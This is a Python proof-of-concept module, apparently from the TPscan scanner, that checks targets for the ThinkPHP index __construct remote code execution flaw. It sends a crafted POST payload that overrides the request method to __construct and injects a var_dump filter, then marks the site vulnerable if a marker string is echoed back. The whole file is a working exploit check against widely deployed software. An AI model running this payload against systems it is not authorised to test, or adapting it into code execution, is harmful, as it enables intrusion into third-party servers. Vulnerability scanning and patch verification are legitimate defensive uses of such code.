#!/usr/bin/env python
# coding=utf-8
from urllib.parse import urljoin

import requests

from utils import get_pocdict

headers = {
    "User-Agent": 'TPscan',
    "Content-Type": "application/x-www-form-urlencoded",
}
payload = "s=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=var_dump"


async def thinkphp_index_construct_rce_verify(url):
    pocdict = get_pocdict(vulnname=__name__)
    try:
        url = urljoin(url, 'index.php?s=index/index/index')
        resp = requests.post(url, data=payload, headers=headers, timeout=15, verify=False)
        if '4e5e5d7364f443e28fbf0d3ae744a59a' in resp.text:
            pocdict['isvul'] = True
            pocdict['vulnurl'] = url
            pocdict['payload'] = payload
            pocdict['proof'] = '4e5e5d7364f443e28fbf0d3ae744a59a'
            pocdict['response'] = resp.text
    except Exception as e:
        pocdict['exception'] = str(e)
    return pocdict
